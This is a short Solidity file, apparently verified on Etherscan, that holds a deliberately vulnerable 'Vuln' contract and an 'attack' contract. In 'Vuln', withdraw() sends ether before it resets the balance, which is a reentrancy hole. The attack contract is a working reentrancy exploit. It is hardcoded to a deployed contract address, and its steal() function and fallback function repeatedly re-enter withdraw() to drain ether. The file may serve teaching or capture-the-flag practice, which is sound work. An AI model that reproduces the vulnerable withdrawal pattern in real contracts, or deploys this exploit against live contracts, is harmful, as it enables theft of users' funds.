/**
 *Submitted for verification at Etherscan.io on 2021-12-07
*/

pragma solidity ^0.5.0;

contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract attack {
    address owner;
    uint i_balance;
    
    Vuln vuln = Vuln(address(0x36A540E3A78084962B75E25877CfACf8846Be018));
    
    constructor () public{
        owner = msg.sender;
    }
    
    function steal() public payable {
        vuln.deposit.value(msg.value)();
        i_balance = address(this).balance;
        vuln.withdraw();
    }
    
    function () external payable{
        if ((address(this).balance - i_balance) < (msg.value)*2) {
            vuln.withdraw();
        }
    }
}